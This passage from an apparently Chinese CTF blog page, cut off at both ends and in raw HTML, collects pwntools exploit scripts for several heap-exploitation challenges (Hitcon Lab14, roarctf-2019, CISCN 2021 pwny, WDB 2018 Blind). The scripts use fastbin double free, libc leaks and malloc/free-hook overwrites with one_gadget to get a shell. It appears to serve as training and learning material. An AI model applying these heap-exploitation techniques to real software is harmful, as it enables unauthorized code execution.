class="line">success(<span class="built_in">hex</span>(mallochook))</span><br><span class="line">libc.address = mallochook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">freehook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sys = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(freehook))</span><br><span class="line">edit(<span class="number">0</span>,p64(sys)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Hitcon-Training-Lab14">Hitcon Training Lab14</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">	p.sendline(<span class="string">&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)	<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)	<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;cccc&quot;</span>)	<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x18</span> +p64(<span class="number">0x91</span>) + p64(<span class="number">0x10</span>)  +p64(bss-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,p64(<span class="number">9999</span>))</span><br><span class="line">back()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>把bss当fastbin来打，会产生memory corruption</p>
<h2 id="roarctf-2019-easy-pwn">roarctf-2019-easy_pwn</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,28967)</span></span><br><span class="line">p = process([<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;</span>,<span class="string">&quot;./easy&quot;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line">malloc(<span class="number">0x90</span>)</span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="number">34</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p8(<span class="number">0xa1</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p8(<span class="number">0xa1</span>))</span><br><span class="line">fill(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)*<span class="number">15</span> + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recv()</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">offset = <span class="number">0x3c4b20</span> </span><br><span class="line"></span><br><span class="line">lib = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x58</span> - offset</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(lib)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook+lib)</span><br><span class="line">realloc = libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook + lib - <span class="number">0x22</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">one_gadgets=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">fill(<span class="number">4</span>,<span class="number">27</span>,<span class="string">&quot;a&quot;</span>*<span class="number">11</span> + p64(lib + one_gadgets[<span class="number">2</span>]) + p64(lib + realloc+<span class="number">4</span>))</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYS9hcnRpY2xlL2RldGFpbHMvMTExMzA3NTMx">https://blog.csdn.net/mcmuyanga/article/details/111307531<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjExMTIuaHRt">https://bbs.pediy.com/thread-261112.htm<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="roarctf-2019-easyheap">roarctf-2019-easyheap</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process([<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;</span>,<span class="string">&quot;./ror&quot;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,25136)</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./libc-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_chunk</span>():</span></span><br><span class="line">	p.sendafter(<span class="string">&quot;please input your username:&quot;</span>,p64(<span class="number">0.1</span>)+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;please input your info:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;666&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;build or free?\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># close()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc2</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back2</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span>():</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk()</span><br><span class="line">back(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">back(<span class="number">2</span>,null)	<span class="comment"># b*0x10 --&gt; unsorted_bin, with size of 0xb1</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x10</span>)	<span class="comment"># split from unsorted_bin, ptr--&gt;this chunk</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x10</span>)	<span class="comment"># likewise, and after, chunk will be placed in small_bin, buf--&gt;this chunk</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">back(<span class="number">2</span>,null)	<span class="comment"># </span></span><br><span class="line">free()	<span class="comment"># double_free here</span></span><br><span class="line"><span class="comment"># &#x27;e&#x27;-&gt;&#x27;d&#x27;&lt;-&#x27;e&#x27;</span></span><br><span class="line"><span class="comment"># aka. fastbin_0x70: buf-&gt;ptr&lt;-buf</span></span><br><span class="line"></span><br><span class="line">fake_chunk_addr = <span class="number">0x0000602060</span></span><br><span class="line">malloc(<span class="number">0x60</span>,p64(fake_chunk_addr)) <span class="comment"># modify bk,ptr-&gt;0x602060</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x10</span>)	<span class="comment">#clean fastbin</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ror&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0xDEADBEEFDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">read_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> libc</span><br><span class="line">base = read_addr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(base)</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">back2(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">back2(<span class="number">2</span>,null)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;3&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free2()</span><br><span class="line">back2(<span class="number">2</span>,null)</span><br><span class="line">free2()</span><br><span class="line"></span><br><span class="line">malloc2(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;4&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;5&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="comment">#[0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">malloc2(<span class="number">0x60</span>, <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one_gadget[<span class="number">3</span>]+base) + p64(realloc + <span class="number">0x14</span>) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;16&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzY2ODAyL2FydGljbGUvZGV0YWlscy8xMDg4NzcxOTE=">https://blog.csdn.net/qq_43766802/article/details/108877191<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2021-ciscn-pwny">2021-ciscn-pwny</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwny&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">gadget=[<span class="string">&#x27;0x4f3d5&#x27;</span>,<span class="string">&#x27;0x4f432&#x27;</span>,<span class="string">&#x27;0x10a41c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,p64(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x100</span>,null)</span><br><span class="line">write(<span class="number">0x100</span>,null)</span><br><span class="line">read(<span class="number">0xfffffffffffffff8</span>)</span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line">stdout =  <span class="built_in">int</span>(p.recvline()[-<span class="number">13</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">libc_addr = stdout - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pie offset_data=code</span></span><br><span class="line">read(<span class="number">0xfffffffffffffff5</span>)</span><br><span class="line">data =  <span class="built_in">int</span>(p.recvline()[-<span class="number">13</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">pie = data - <span class="number">0x202008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print hex(stdout - 0x202020)</span></span><br><span class="line"></span><br><span class="line">libc.address = libc_addr</span><br><span class="line">mhook = libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one = <span class="built_in">int</span>(gadget[<span class="number">1</span>],<span class="number">16</span>) + libc_addr</span><br><span class="line"></span><br><span class="line">offset = (mhook - pie - <span class="number">0x202060</span>)//<span class="number">8</span>   <span class="comment">#id</span></span><br><span class="line"></span><br><span class="line">write(offset,p64(realloc + <span class="number">2</span>))</span><br><span class="line">write(offset-<span class="number">1</span>,p64(one))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)	<span class="comment">#scanf, too large use chunk(malloc hook)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9hcnR0bmJhMy5jbi8yMDIxLzA1LzE1L0NURi0wWDA0LUNJU0NOMjAyMS1QUkVMSU1JTkFSWQ==">https://arttnba3.cn/2021/05/15/CTF-0X04-CISCN2021-PRELIMINARY<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RvcmVidHIvYXJ0aWNsZS9kZXRhaWxzLzExNzEzNzMzNA==">https://blog.csdn.net/Torebtr/article/details/117137334<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0E5NTE4NjA1NTUvYXJ0aWNsZS9kZXRhaWxzLzExNjkxMDk0NQ==">https://blog.csdn.net/A951860555/article/details/116910945<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2018-WDB-Blind">2018-WDB-Blind</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./blind&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26142)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">back = <span class="number">0x4008E3</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x60201d</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;c&quot;*0x43 + p64(0x602020) + p64(0x0602080) +p64(0x0602080+0x68) + p64(0x0602080 + 0x68*2) + p64(0x0602080 + 0x68*3)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaa&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x602020</span>) + p64(<span class="number">0x602090</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>) </span><br><span class="line">payload += p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">2</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">fakechunk = p64(<span class="number">0x00000000fbad8080</span>) + p64(<span class="number">0x602060</span>)*<span class="number">7</span> + p64(<span class="number">0x602061</span>) + p64(<span class="number">0</span>)*<span class="number">4</span>  + p64(<span class="number">0x602060</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x602060</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0x602060</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x00000000ffffffff</span>) + p64(<span class="number">0</span>) +  p64(<span class="number">0</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,fakechunk[:<span class="number">0x68</span>])</span><br><span class="line">change(<span class="number">2</span>,fakechunk[<span class="number">0x68</span>:<span class="number">0x68</span>*<span class="number">2</span>])</span><br><span class="line">change(<span class="number">3</span>,fakechunk[<span class="number">0x68</span>*<span class="number">2</span>:]+<span 